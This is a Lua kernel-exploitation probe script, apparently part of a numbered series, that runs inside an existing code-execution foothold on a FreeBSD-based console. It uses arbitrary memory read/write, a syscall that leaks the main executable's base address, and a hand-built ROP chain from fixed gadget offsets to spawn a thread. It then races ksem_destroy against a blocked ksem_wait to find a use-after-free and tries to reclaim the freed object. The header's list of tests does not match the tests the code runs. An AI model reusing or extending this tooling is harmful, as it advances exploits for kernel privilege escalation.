-- CRASH_CLASS: MODERATE
-- PROBE 389a: ksem destroy-while-waiting race
--
-- Context: 388d confirmed full ksem lifecycle. Key question:
-- what happens when ksem_destroy(408) runs while a child thread
-- is blocked in ksem_wait(402) on the same semaphore?
--
-- FreeBSD should wake waiters before destroying, but bugs in
-- reference counting can cause UAF of the kernel sem struct.
--
-- Tests:
--   [A] Child blocks on ksem_wait, main destroys → child behavior?
--   [B] Named sem: unlink+close while child waits
--   [C] Rapid create-destroy cycles looking for kernel anomalies
--   [D] Destroy + immediate reclaim (heap replacement)

print("=== PROBE 389a: ksem race ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local function zero_buf(addr, len)
    for i = 0, len - 4, 4 do wd(N(addr) + i, 0) end
end

local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

-- Syscalls
local sc_ksem_close    = mk(400)
local sc_ksem_post     = mk(401)
local sc_ksem_wait     = mk(402)
local sc_ksem_trywait  = mk(403)
local sc_ksem_init     = mk(404)
local sc_ksem_open     = mk(405)
local sc_ksem_unlink   = mk(406)
local sc_ksem_getval   = mk(407)
local sc_ksem_destroy  = mk(408)
local sc_close         = mk(6)
local sc_thr_new       = mk(455)
local sc_nanosleep     = mk(240)
local sc_thr_kill      = mk(433)

local idp = memory.alloc(16)
local val_buf = memory.alloc(16)

local function ksem_create(value)
    zero_buf(idp, 16)
    local ok, rv = pcall(function() return sc_ksem_init(idp, uint64(value or 1)) end)
    local ret = ok and N(rv) or -999
    local id = rd(N(idp))
    return ret, id or 0
end

local function ksem_getval(id)
    zero_buf(val_buf, 16)
    local ok, rv = pcall(function() return sc_ksem_getval(uint64(id), val_buf) end)
    local ret = ok and N(rv) or -999
    local val = rd(N(val_buf))
    return ret, val or -1
end

-- Eboot gadgets (from probe 272a)
local info = memory.alloc(0x200)
wd(N(info), 0x160)
local sc_info = mk(593)
pcall(function() sc_info(uint64(0), info) end)
local eboot_lo = rd(N(info) + 0x108)
local eboot_hi = rd(N(info) + 0x10C)
local eboot = uint64(string.format("0x%X%08X", eboot_hi, eboot_lo))
print(string.format("eboot=0x%X%08X", eboot_hi, eboot_lo))

local function eboot_off(off)
    return uint64(string.format("0x%X%08X", eboot_hi, eboot_lo + off))
end

-- Gadgets
local pop_rax_ret     = eboot_off(0x992)
local pop_rdi_ret     = eboot_off(0xC9DFE)
local pop_rsi_ret     = eboot_off(0xD77D)
local pop_rdx_ret     = eboot_off(0x3B02D7)
local pop_rcx_ret     = eboot_off(0xE64)
local pop_rdi_rbp_ret = eboot_off(0x169)
local pop_rsi_rbp_ret = eboot_off(0x78)
local bare_ret        = eboot_off(0x42)
local mov_rdi_rax_ret = eboot_off(0x92C67)  -- mov [rdi], rax; ret

-- sysarch(129=SET_FSBASE, &fake_tcb) for child TLS fix
local sc_sysarch_no = 165

-- fn_addr = libkernel syscall stub
local fn_addr = stub

local function sleep_ms(ms)
    local ts = memory.alloc(16)
    zero_buf(ts, 16)
    wd(N(ts), 0)
    wd(N(ts) + 8, ms * 1000000)
    pcall(function() sc_nanosleep(ts, uint64(0)) end)
end

-- Build child ROP chain that:
-- 1. Sets up fake TCB (sysarch SET_FSBASE)
-- 2. Calls ksem_wait(402, sem_id) — BLOCKS until post or destroy
-- 3. Writes result marker to shared memory
-- 4. Exits (thr_exit)
local function spawn_waiter(sem_id, result_addr)
    local stack_size = 0x10000
    local stack = memory.alloc(stack_size)
    zero_buf(stack, 256)

    -- Fake TCB for child TLS
    local fake_tcb = memory.alloc(0x1000)
    zero_buf(fake_tcb, 0x1000)
    -- Self-referencing pointer at +0x00
    wq(N(fake_tcb), fake_tcb)

    -- Align RSP: ((stack_base + stack_size) & ~0xF) - 8
    local rsp_val = N(stack) + stack_size
    rsp_val = rsp_val - (rsp_val % 16) - 8

    -- Write sentinel to result
    wd(N(result_addr), 0xDEAD)

    -- Build ROP chain at top of stack
    local off = 0
    local function push(val)
        wq(rsp_val + off, val)
        off = off + 8
    end

    -- Step 1: sysarch(129, &fake_tcb) for TLS fix
    push(pop_rax_ret)
    push(uint64(sc_sysarch_no))       -- rax = 165
    push(pop_rdi_rbp_ret)
    push(uint64(129))                  -- rdi = SET_FSBASE
    push(uint64(0))                    -- rbp (junk)
    -- rsi = pointer to &fake_tcb
    local tcb_ptr = memory.alloc(8)
    wq(N(tcb_ptr), fake_tcb)
    push(pop_rsi_rbp_ret)
    push(tcb_ptr)                      -- rsi = &tcb_ptr
    push(uint64(0))                    -- rbp (junk)
    push(fn_addr)                      -- call sysarch

    -- Step 2: ksem_wait(402, sem_id) — this BLOCKS
    push(pop_rax_ret)
    push(uint64(402))                  -- rax = ksem_wait
    push(pop_rdi_rbp_ret)
    push(uint64(sem_id))               -- rdi = sem id
    push(uint64(0))                    -- rbp (junk)
    push(fn_addr)                      -- call ksem_wait

    -- Step 3: Write marker (rax=wait result) to result_addr
    push(pop_rdi_rbp_ret)
    push(result_addr)                  -- rdi = result_addr
    push(uint64(0))                    -- rbp (junk)
    push(mov_rdi_rax_ret)              -- [rdi] = rax

    -- Step 4: thr_exit(0)
    push(pop_rax_ret)
    push(uint64(431))                  -- rax = thr_exit
    push(pop_rdi_rbp_ret)
    push(uint64(0))                    -- rdi = 0
    push(uint64(0))                    -- rbp (junk)
    push(fn_addr)                      -- call thr_exit

    -- thr_param struct (0x38 bytes)
    local param = memory.alloc(0x40)
    zero_buf(param, 0x40)
    -- +0x00: start_func — first gadget in ROP chain
    -- We use bare_ret as entry, so RSP is already set to our chain
    -- Actually, thr_new starts with start_func(arg): rip=start_func, rdi=arg
    -- We need start_func to be our first gadget (pop_rax_ret)
    -- But thr_new sets RSP to stack_base+stack_size, not to our chain...
    -- Wait: thr_new sets RIP=start_func, RSP=stack_base+stack_size, RDI=arg
    -- Our ROP chain starts at rsp_val which IS stack_base+stack_size aligned.
    -- start_func needs to be a "ret" so it pops the first ROP gadget.
    wq(N(param) + 0x00, bare_ret)      -- start_func = ret (starts ROP)
    wq(N(param) + 0x08, uint64(0))     -- arg (unused, chain is on stack)
    wq(N(param) + 0x10, stack)          -- stack_base
    wq(N(param) + 0x18, uint64(stack_size))  -- stack_size
    -- +0x20: tls_base (0)
    -- +0x28: tls_size (0)
    local child_tid = memory.alloc(8)
    zero_buf(child_tid, 8)
    wq(N(param) + 0x30, child_tid)      -- child_tid

    local ok, rv = pcall(function() return sc_thr_new(param, uint64(0x38)) end)
    local ret = ok and N(rv) or -999
    local tid = rd(N(child_tid))
    return ret, tid or 0, result_addr
end

-- ===================================================================
-- [A] Destroy while child waits
-- ===================================================================
print("[A] destroy while child blocks in ksem_wait")

-- Clean up any leaked sems first
for fd = 0x17, 0x40 do
    pcall(function() sc_close(uint64(fd)) end)
end

local ret, sem_a = ksem_create(0)  -- value=0 so ksem_wait will BLOCK
print(string.format("  create(val=0): ret=%d, id=0x%X", ret, sem_a))

if ret ~= 0 then
    print("  FATAL: can't create sem")
    print("canary=" .. (alive() and "OK" or "FAIL"))
    return
end

local result_a = memory.alloc(16)
zero_buf(result_a, 16)
wd(N(result_a), 0xDEAD)

local tret, tid_a = spawn_waiter(sem_a, result_a)
print(string.format("  spawn waiter: ret=%d, tid=%d", tret, tid_a))

if tret ~= 0 then
    print("  FATAL: can't spawn child")
    pcall(function() sc_close(uint64(sem_a)) end)
    print("canary=" .. (alive() and "OK" or "FAIL"))
    return
end

-- Give child time to enter ksem_wait
sleep_ms(50)

-- Check child is alive
local ok, rv = pcall(function() return sc_thr_kill(uint64(tid_a), uint64(0)) end)
print("  child alive check: " .. (ok and N(rv) or -999))

-- Check result marker (should still be 0xDEAD = waiting)
local marker = rd(N(result_a))
print(string.format("  result marker: 0x%X (0xDEAD=still waiting)", marker))

-- NOW: destroy the sem while child is blocked in ksem_wait
print("  >>> destroying sem while child waits <<<")
ok, rv = pcall(function() return sc_ksem_destroy(uint64(sem_a)) end)
print("  ksem_destroy(408): ret=" .. (ok and N(rv) or -999))

-- Wait and check what happened to child
sleep_ms(100)

-- Check result marker
marker = rd(N(result_a))
print(string.format("  result after destroy: 0x%X", marker))

-- Is child still alive?
ok, rv = pcall(function() return sc_thr_kill(uint64(tid_a), uint64(0)) end)
local child_alive = ok and N(rv) == 0
print("  child alive after destroy: " .. tostring(child_alive))

-- Try posting to destroyed sem (should fail)
ok, rv = pcall(function() return sc_ksem_post(uint64(sem_a)) end)
print("  post to destroyed sem: ret=" .. (ok and N(rv) or -999))

-- If child is still blocked, try to wake it with post
if marker == 0xDEAD and child_alive then
    -- Sem was destroyed but child still waiting??
    -- Create a new sem that might get the same ID
    local r2, sem_new = ksem_create(1)
    print(string.format("  new sem (reclaim?): ret=%d, id=0x%X (same=%s)", r2, sem_new, tostring(sem_new == sem_a)))
    if r2 == 0 then
        -- Post on new sem — will child wake on old destroyed sem?
        pcall(function() sc_ksem_post(uint64(sem_new)) end)
        sleep_ms(50)
        marker = rd(N(result_a))
        print(string.format("  result after reclaim+post: 0x%X ***", marker))
        pcall(function() sc_close(uint64(sem_new)) end)
    end
end

-- Final state
sleep_ms(100)
marker = rd(N(result_a))
ok, rv = pcall(function() return sc_thr_kill(uint64(tid_a), uint64(0)) end)
print(string.format("  FINAL: marker=0x%X, child_alive=%s", marker, tostring(ok and N(rv) == 0)))

if not alive() then print("DEAD after [A]"); return end
print("")

-- ===================================================================
-- [B] Post-then-destroy race (no blocking)
-- ===================================================================
print("[B] rapid create-destroy cycles")

local anomalies = 0
for i = 1, 50 do
    if not alive() then break end
    local r, id = ksem_create(1)
    if r ~= 0 then
        print(string.format("  cycle %d: create failed (ret=%d)", i, r))
        break
    end
    -- Post a few times
    pcall(function() sc_ksem_post(uint64(id)) end)
    pcall(function() sc_ksem_post(uint64(id)) end)
    -- Destroy
    ok, rv = pcall(function() return sc_ksem_destroy(uint64(id)) end)
    local dret = ok and N(rv) or -999
    if dret ~= 0 then
        anomalies = anomalies + 1
        print(string.format("  cycle %d: destroy ret=%d ***", i, dret))
    end
    -- Try to use after destroy
    local gr, gv = ksem_getval(id)
    if gr == 0 then
        anomalies = anomalies + 1
        print(string.format("  cycle %d: USE AFTER DESTROY! getvalue ret=0, val=%d ***", i, gv))
    end
end
print(string.format("  50 cycles: %d anomalies", anomalies))

if not alive() then print("DEAD after [B]"); return end
print("")

-- ===================================================================
-- [C] Summary
-- ===================================================================
print("[C] SUMMARY")
print("  destroy-while-wait: tested above")
print("  rapid cycles: " .. anomalies .. " anomalies")

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 389a COMPLETE ===")
